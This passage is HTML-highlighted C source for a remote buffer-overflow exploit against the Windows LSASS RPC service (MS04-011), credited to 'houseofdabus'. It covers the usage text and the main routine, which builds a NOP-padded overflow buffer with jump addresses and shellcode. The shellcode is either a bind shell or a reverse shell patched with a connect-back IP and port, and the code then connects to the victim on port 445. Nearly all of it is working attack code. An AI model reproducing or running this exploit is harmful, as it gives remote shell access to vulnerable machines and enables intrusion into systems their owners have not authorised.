</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"%s &lt;target&gt; &lt;victim IP&gt; &lt;bindport&gt; [connectback IP] [options]\n\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">prog</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Targets:\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">" %d [0x%.8x]: %s\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ttarget</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">num</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ttarget</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">jmpaddr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ttarget</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">name</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"\nOptions:\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">" -t: Detect remote OS:\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">" Windows 5.1 - WinXP\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">" Windows 5.0 - Win2k\n\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">



</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">argc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">argv</span><span class="sc10">[])</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">opt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">target</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">hostipc</span><span class="sc10">[</span><span class="sc4">40</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">hostipc2</span><span class="sc10">[</span><span class="sc4">40</span><span class="sc10">*</span><span class="sc4">2</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">ip</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sc</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc11">LEN</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">sendbuf</span><span class="sc10">[(</span><span class="sc11">LEN</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">)*</span><span class="sc4">2</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">req4u</span><span class="sc10">[</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">req4</span><span class="sc10">)+</span><span class="sc4">20</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">screq</span><span class="sc10">[</span><span class="sc11">BUFSIZE</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">req7</span><span class="sc10">)+</span><span class="sc4">1500</span><span class="sc10">+</span><span class="sc4">440</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">screq2k</span><span class="sc10">[</span><span class="sc4">4348</span><span class="sc10">+</span><span class="sc4">4060</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">screq2k2</span><span class="sc10">[</span><span class="sc4">4348</span><span class="sc10">+</span><span class="sc4">4060</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">recvbuf</span><span class="sc10">[</span><span class="sc4">1600</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">strasm</span><span class="sc10">[]=</span><span class="sc6">"\x66\x81\xEC\x1C\x07\xFF\xE4"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">strBuffer</span><span class="sc10">[</span><span class="sc11">BUFSIZE</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">targetnum</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sockfd</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">dport</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">445</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hostent</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">he</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">their_addr</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">smblen</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">unclen</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">WSADATA</span><span class="sc0"> </span><span class="sc11">wsa</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"\nMS04011 Lsasrv.dll RPC buffer overflow remote exploit v0.1\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"--- Coded by .::[ houseofdabus ]::. ---\n\n"</span><span class="sc10">);</span><span class="sc0">


</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">argc</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">usage</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">target</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">sprintf</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">hostipc</span><span class="sc10">,</span><span class="sc6">"\\\\%s\\ipc$"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">target</span><span class="sc10">);</span><span class="sc0"> 

</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">40</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">hostipc2</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">*</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">hostipc</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">hostipc2</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">*</span><span class="sc4">2</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">req4u</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">req4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">req4</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">req4u</span><span class="sc10">+</span><span class="sc4">48</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hostipc2</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hostipc</span><span class="sc10">)*</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">req4u</span><span class="sc10">+</span><span class="sc4">47</span><span class="sc10">+</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hostipc</span><span class="sc10">)*</span><span class="sc4">2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">req4</span><span class="sc10">+</span><span class="sc4">87</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">9</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">smblen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">52</span><span class="sc10">+(</span><span class="sc16">char</span><span class="sc10">)</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hostipc</span><span class="sc10">)*</span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">req4u</span><span class="sc10">+</span><span class="sc4">3</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">smblen</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">unclen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">9</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">)</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hostipc</span><span class="sc10">)*</span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">req4u</span><span class="sc10">+</span><span class="sc4">45</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">unclen</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">argc</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">memcmp</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc6">"-t"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc11">opt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">argc</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">opt</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]))^(</span><span class="sc11">USHORT</span><span class="sc10">)</span><span class="sc4">0x9999</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">ip</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">])^(</span><span class="sc11">ULONG</span><span class="sc10">)</span><span class="sc4">0x99999999</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(&amp;</span><span class="sc11">reverseshell</span><span class="sc10">[</span><span class="sc4">118</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">port</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(&amp;</span><span class="sc11">reverseshell</span><span class="sc10">[</span><span class="sc4">111</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">ip</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">sc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">reverseshell</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]))^(</span><span class="sc11">USHORT</span><span class="sc10">)</span><span class="sc4">0x9999</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(&amp;</span><span class="sc11">bindshell</span><span class="sc10">[</span><span class="sc4">176</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">port</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">sc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">bindshell</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">NOP</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LEN</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc2">//memcpy(&amp;buf[2020], "\x3c\x12\x15\x75", 4);
</span><span class="sc11">memcpy</span><span class="sc10">(&amp;</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">2020</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">ttarget</span><span class="sc10">[</span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">])].</span><span class="sc11">jmpaddr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(&amp;</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">2036</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">sc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">));</span><span class="sc0">

</span><span class="sc11">memcpy</span><span class="sc10">(&amp;</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">2840</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc6">"\xeb\x06\xeb\x06"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(&amp;</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">2844</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">ttarget</span><span class="sc10">[</span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">])].</span><span class="sc11">jmpaddr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">// jmp ebx addr
//memcpy(&amp;buf[2844], "\x3c\x12\x15\x75", 4); // jmp ebx addr
</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(&amp;</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">2856</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">sc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">));</span><span class="sc0">

</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">LEN</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">sendbuf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">*</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">sendbuf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">*</span><span class="sc4">2</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">sendbuf</span><span class="sc10">[</span><span class="sc11">LEN</span><span class="sc10">*</span><span class="sc4">2</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">sendbuf</span><span class="sc10">[</span><span class="sc11">LEN</span><span class="sc10">*</span><span class="sc4">2</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">screq2k</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BUFSIZE</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">req7</span><span class="sc10">)+</span><span class="sc4">1500</span><span class="sc10">)*</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">screq2k2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BUFSIZE</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">req7</span><span class="sc10">)+</span><span class="sc4">1500</span><span class="sc10">)*</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">strBuffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">NOP</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">BUFSIZE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">strBuffer</span><span class="sc10">+</span><span class="sc4">160</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">strBuffer</span><span class="sc10">+</span><span class="sc4">1980</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strasm</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">strasm</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc10">*(</span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">strBuffer</span><span class="sc10">[</span><span class="sc4">1964</span><span class="sc10">]=</span><span class="sc11">ttarget</span><span class="sc10">[</span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">])].</span><span class="sc11">jmpaddr</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">screq</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">BUFSIZE</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">req7</span><span class="sc10">)+</span><span class="sc4">1500</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">WSAStartup</span><span class="sc10">(</span><span class="sc11">MAKEWORD</span><span class="sc10">(</span><span class="sc4">2</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">),&amp;</span><span class="sc11">wsa</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">he</span><span class="sc10">=</span><span class="sc11">gethostbyname</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">// get the host info
</span><span class="sc11">perror</span><span class="sc10">(</span><span class="sc6">"[-] gethostbyname "</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">sockfd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">perror</span><span class="sc10">(</span><span class="sc6">"socket"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc11">their_addr</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">their_addr</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">dport</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">their_addr</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">*((</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">in_addr</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">he</span><span class="sc10">-&gt;</span><span class="sc11">h_addr</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memset</span><span class="sc10">(&amp;(</span><span class="sc11">their_addr</span><span class="sc10">.</span><span class="sc11">sin_zero</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"[*] Target: IP: %s: OS: %s\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">ttarget</span><span class="sc10">[</span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">])].</span><span class="sc11">name</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"[*] Connecting to %s:445 ... "</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connect</span><span class="sc10">(</span><span class="sc11">sockfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">their_addr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"\n[-] Sorry, cannot connect to %s:445. Try again...\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"OK\n"</span><span class="sc10">);</span><span class="sc0">

